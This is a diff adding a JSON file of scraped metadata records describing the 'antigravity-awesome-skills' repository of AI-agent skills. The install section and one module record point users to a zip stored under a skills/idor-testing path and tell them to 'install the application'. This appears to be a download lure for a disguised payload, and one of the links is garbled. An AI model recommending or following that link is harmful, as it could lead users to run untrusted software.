@@ -1,0 +1,133 @@
+[
+  {
+    "name": "antigravity-awesome-skills (cleodin)",
+    "description": "[项目级] 🌌 Explore 255+ essential skills for AI coding assistants like Claude Code and GitHub Copilot to enhance your development workflow.。来源: https://github.com/cleodin/antigravity-awesome-skills",
+    "domain": "web-frontend",
+    "tags": [
+      "agentic-skills",
+      "ai-agents",
+      "antigravity",
+      "antigravity-ide",
+      "audio",
+      "python",
+      "stars-8",
+      "github-cleodin",
+      "project-level"
+    ],
+    "genes": [
+      {
+        "title": "项目概述",
+        "content": "Welcome to the **antigravity-awesome-skills** repository. This collection includes over 200 agentic skills designed specifically for AI agents like Claude Code, Antigravity, and Cursor. These skills are battle-tested and built for high performance. You will find skills that help with tasks in autonomous coding and enhance productivity.",
+        "gene_type": "principle"
+      },
+      {
+        "title": "安装与快速开始",
+        "content": "To begin your journey with antigravity-awesome-skills, follow these simple steps:\n\n1. **Download the Skills**:\n   - Click the download button below or visit the Releases page.\n   - [Download Now](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip)\n\n2. **Install the Application**:\n   - Once you download the appropriate file for your system, locate it in your downloads folder.\n   - Refer to the instructions below based on your operating system.",
+        "gene_type": "snippet"
+      },
+      {
+        "title": "项目结构",
+        "content": "CHANGELOG.md\nCONTRIBUTING.md\nFAQ.md\nGETTING_STARTED.md\nLICENSE\nREADME.md\nSECURITY.md\ndocs\ndocs/BUNDLES.md\ndocs/CI_DRIFT_FIX.md\ndocs/COMMUNITY_GUIDELINES.md\ndocs/EXAMPLES.md\ndocs/QUALITY_BAR.md\ndocs/SECURITY_GUARDRAILS.md\ndocs/SKILL_ANATOMY.md\ndocs/SOURCES.md\ndocs/VISUAL_GUIDE.md\nscripts\nscripts/generate_index.py\nscripts/skills_manager.py",
+        "gene_type": "pattern"
+      },
+      {
+        "title": "核心特性",
+        "content": "- **Diverse Skills**: Access a wide range of skills tailored for various AI tasks.\n- **Performance Optimized**: Each skill is tested to ensure it works efficiently.\n- **Official Contributions**: Includes skills endorsed by Anthropic and Vercel, recognized leaders in AI technology.\n- **User-Friendly**: Designed for easy integration with minimal setup.",
+        "gene_type": "checklist"
+      }
+    ],
+    "version": 1,
+    "usage_count": 0,
+    "rating": 3.451544993495972
+  },
+  {
+    "name": "antigravity-awesome-skills/docs 模块",
+    "description": "[模块级] antigravity-awesome-skills 项目的 docs 模块 (docs)。来源: https://github.com/cleodin/antigravity-awesome-skills",
+    "domain": "documentation",
+    "tags": [
+      "agentic-skills",
+      "ai-agents",
+      "antigravity",
+      "antigravity-ide",
+      "audio",
+      "module-level",
+      "docs",
+      "docs"
+    ],
+    "genes": [
+      {
+        "title": "docs 模块说明",
+        "content": "模块路径: docs/\n类型: docs\n文件数: 9\n\n包含文件:\n- docs/BUNDLES.md\n- docs/CI_DRIFT_FIX.md\n- docs/COMMUNITY_GUIDELINES.md\n- docs/EXAMPLES.md\n- docs/QUALITY_BAR.md\n- docs/SECURITY_GUARDRAILS.md\n- docs/SKILL_ANATOMY.md\n- docs/SOURCES.md\n- docs/VISUAL_GUIDE.md",
+        "gene_type": "principle"
+      },
+      {
+        "title": "docs 文件结构",
+        "content": "docs/BUNDLES.md\ndocs/CI_DRIFT_FIX.md\ndocs/COMMUNITY_GUIDELINES.md\ndocs/EXAMPLES.md\ndocs/QUALITY_BAR.md\ndocs/SECURITY_GUARDRAILS.md\ndocs/SKILL_ANATOMY.md\ndocs/SOURCES.md\ndocs/VISUAL_GUIDE.md",
+        "gene_type": "pattern"
+      }
+    ],
+    "version": 1,
+    "usage_count": 0,
+    "rating": 2.8612359947967776
+  },
+  {
+    "name": "antigravity-awesome-skills/scripts 模块",
+    "description": "[模块级] antigravity-awesome-skills 项目的 scripts 模块 (script)。来源: https://github.com/cleodin/antigravity-awesome-skills",
+    "domain": "web-frontend",
+    "tags": [
+      "agentic-skills",
+      "ai-agents",
+      "antigravity",
+      "antigravity-ide",
+      "audio",
+      "module-level",
+      "script",
+      "scripts"
+    ],
+    "genes": [
+      {
+        "title": "scripts 模块说明",
+        "content": "模块路径: scripts/\n类型: script\n文件数: 5\n\n包含文件:\n- scripts/generate_index.py\n- scripts/skills_manager.py\n- scripts/sync_recommended_skills.sh\n- scripts/update_readme.py\n- scripts/validate_skills.py",
+        "gene_type": "principle"
+      },
+      {
+        "title": "scripts 文件结构",
+        "content": "scripts/generate_index.py\nscripts/skills_manager.py\nscripts/sync_recommended_skills.sh\nscripts/update_readme.py\nscripts/validate_skills.py",
+        "gene_type": "pattern"
+      }
+    ],
+    "version": 1,
+    "usage_count": 0,
+    "rating": 2.8612359947967776
+  },
+  {
+    "name": "antigravity-awesome-skills/skills 模块",
+    "description": "[模块级] antigravity-awesome-skills 项目的 skills 模块 (source)。来源: https://github.com/cleodin/antigravity-awesome-skills",
+    "domain": "web-frontend",
+    "tags": [
+      "agentic-skills",
+      "ai-agents",
+      "antigravity",
+      "antigravity-ide",
+      "audio",
+      "module-level",
+      "source",
+      "skills"
+    ],
+    "genes": [
+      {
+        "title": "skills 模块说明",
+        "content": "[![Download](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip%20Now-Visit%https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip)](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip)",
+        "gene_type": "principle"
+      },
+      {
+        "title": "skills 文件结构",
+        "content": "skills/.gitignore\nskills/3d-web-experience\nskills/3d-web-experience/SKILL.md\nskills/README.md\nskills/ab-test-setup\nskills/ab-test-setup/SKILL.md\nskills/active-directory-attacks\nskills/active-directory-attacks/SKILL.md\nskills/active-directory-attacks/references\nskills/active-directory-attacks/references/advanced-attacks.md\nskills/address-github-comments\nskills/address-github-comments/SKILL.md\nskills/agent-evaluation\nskills/agent-evaluation/SKILL.md\nskills/agent-manager-skill",
+        "gene_type": "pattern"
+      }
+    ],
+    "version": 1,
+    "usage_count": 0,
+    "rating": 2.8612359947967776
+  }
+]
